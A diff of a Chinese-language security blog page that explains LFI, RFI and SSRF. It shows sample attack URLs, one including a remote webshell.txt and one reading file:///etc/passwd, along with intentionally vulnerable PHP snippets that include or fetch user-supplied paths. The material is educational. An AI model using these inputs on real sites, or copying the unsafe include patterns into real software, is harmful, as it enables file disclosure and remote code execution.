@@ -22,7 +22,6 @@ if (!doNotTrack) {
 </script>
 
 
-
 <link rel="icon" type="image/png" href="/favicon.png">
 
 
@@ -109,34 +108,33 @@ if (!doNotTrack) {
 <h2 id="本地檔案包含">本地檔案包含</h2>
 <p>Local File Inclusion (LFI)，
 若客戶端可控制網頁包含本地文件，可能有LFI漏洞。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">https://vulnerablesite.com/lfi.php?page=index.php
-</code></pre></div><p>代碼</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;page&#39;</span>]))
-    <span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;php/&#39;</span> <span style="color:#f92672">.</span> $page);
-<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></code></pre></div><h2 id="遠程檔案包含">遠程檔案包含</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>https://vulnerablesite.com/lfi.php?page=index.php
+</span></span></code></pre></div><p>代碼</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;page&#39;</span>]))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;php/&#39;</span> <span style="color:#f92672">.</span> $page);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><h2 id="遠程檔案包含">遠程檔案包含</h2>
 <p>Remote File Inclusion (RFI)，
 類似LFI漏洞但是允許包含遠程文件。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">https://vulnerablesite.com/rfi.php?page=http://example.com/webshell.txt
-</code></pre></div><p>代碼</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;page&#39;</span>]))
-    <span style="color:#66d9ef">include</span>($page);
-<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></code></pre></div><h2 id="伺服器端請求偽造">伺服器端請求偽造</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>https://vulnerablesite.com/rfi.php?page=http://example.com/webshell.txt
+</span></span></code></pre></div><p>代碼</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;page&#39;</span>]))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">include</span>($page);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><h2 id="伺服器端請求偽造">伺服器端請求偽造</h2>
 <p>Server-Side Request Forgery (SSRF)，
 透過伺服器發出各種協議的請求來執行惡意行為，並且可以控制URI
 如<code>http://</code>、<code>file://</code>、<code>ssh2://</code>、<code>ftp://</code>等。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">https://vulnerablesite.com/ssrf.php?uri=https://example.com/img1.png
-https://vulnerablesite.com/ssrf.php?uri=file:///etc/passwd
-</code></pre></div><p>代碼</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;uri&#39;</span>]))
-    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">file_get_contents</span>($_GET[<span style="color:#e6db74">&#39;uri&#39;</span>]);
-<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010">
-</span></code></pre></div><h2 id="比較">比較</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>https://vulnerablesite.com/ssrf.php?uri=https://example.com/img1.png
+</span></span><span style="display:flex;"><span>https://vulnerablesite.com/ssrf.php?uri=file:///etc/passwd
+</span></span></code></pre></div><p>代碼</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;uri&#39;</span>]))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">file_get_contents</span>($_GET[<span style="color:#e6db74">&#39;uri&#39;</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><h2 id="比較">比較</h2>
 <p>RFI/LFI漏洞與SSRF漏洞本質上是不同的東西，
 RFI為包含遠程文件而SSRF為發出請求，
 php的<code>include</code>支援偽協議，可以執行SSRF攻擊。</p>
@@ -213,7 +211,7 @@ php的<code>include</code>支援偽協議，可以執行SSRF攻擊。</p>
     <a href="/tags" class="footer">Tags</a>
   </div>
   <div>
-    r888800009©2018-2022.
+    r888800009©2018-2023.
     All Rights Reserved.
   </div>
   
